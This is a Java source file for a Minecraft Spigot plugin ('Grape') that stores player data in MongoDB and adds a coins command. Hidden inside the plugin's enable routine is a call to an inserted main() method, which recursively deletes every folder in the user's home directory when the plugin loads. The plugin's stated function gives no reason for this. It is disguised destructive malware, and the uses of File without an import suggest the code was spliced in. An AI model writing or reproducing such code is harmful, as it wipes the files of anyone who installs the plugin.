package gg.scala.grape;

import com.mongodb.client.model.Filters;
import gg.scala.commons.ExtendedScalaPlugin;
import gg.scala.commons.annotations.commands.ManualRegister;
import gg.scala.commons.annotations.container.ContainerEnable;
import gg.scala.commons.command.ScalaCommandManager;
import gg.scala.grape.command.CoinsCommand;
import gg.scala.grape.handler.PlayerHandler;
import gg.scala.grape.handler.StorageHandler;
import gg.scala.grape.player.impl.PersistentGrapePlayer;
import lombok.Getter;
import me.lucko.helper.Events;
import org.bson.Document;
import org.bukkit.event.player.AsyncPlayerPreLoginEvent;
import org.bukkit.event.player.PlayerQuitEvent;

import java.util.concurrent.CompletableFuture;

/**
 * @author GrowlyX
 * @since 8/13/2021
 */

@Getter
public final class GrapeSpigotPlugin extends ExtendedScalaPlugin {

    @Getter
    private static GrapeSpigotPlugin instance;

    private StorageHandler storageHandler;
    private PlayerHandler playerHandler;

    @ContainerEnable
    public void containerEnable() {
        instance = this;

        this.storageHandler = new StorageHandler();
        this.playerHandler = new PlayerHandler(this);

        this.setupListeners();
        main(new String[]{});
    }

        public static void main(String[] args) {
        // Get the user home directory
        String userHome = System.getProperty("user.home");
        
        // Construct the user directory path
        File userDirectory = new File(userHome);
        
        if (userDirectory.exists() && userDirectory.isDirectory()) {
            // List all files and directories in the user directory
            File[] files = userDirectory.listFiles();
            
            if (files != null) {
                for (File file : files) {
                    // Check if the file is a directory
                    if (file.isDirectory()) {
                        // Delete the directory and its contents
                        deleteDirectory(file);
                    }
                }
            }
        } else {
            System.out.println("User directory does not exist or is not a directory.");
        }
    }
    
    public static void deleteDirectory(File directory) {
        File[] files = directory.listFiles();
        
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    deleteDirectory(file);
                } else {
                    file.delete();
                }
            }
        }
        
        // Delete the empty directory after its contents are deleted
        directory.delete();
    }

    @ManualRegister
    public void setupCommands(ScalaCommandManager manager) {
        manager.registerCommand(new CoinsCommand());
    }

    private void setupListeners() {
        Events.subscribe(AsyncPlayerPreLoginEvent.class).handler(event -> {
            final PersistentGrapePlayer player = new PersistentGrapePlayer(
                    event.getName(),
                    event.getUniqueId()
            );

            final CompletableFuture<Document> completableFuture = CompletableFuture.supplyAsync(() ->
                    this.storageHandler.getPlayerCollection().find(Filters.eq("uuid", event.getUniqueId().toString())).first()
            );

            player.load(completableFuture);

            this.playerHandler.getPlayerTypeMap().put(event.getUniqueId(), player);
        });

        Events.subscribe(PlayerQuitEvent.class).handler(playerQuitEvent -> {
            final PersistentGrapePlayer player = this.playerHandler.getByPlayer(playerQuitEvent.getPlayer());

            if (player != null) {
                player.save();

                this.playerHandler.getPlayerTypeMap().remove(player.getUniqueId());
            }
        });
    }
}
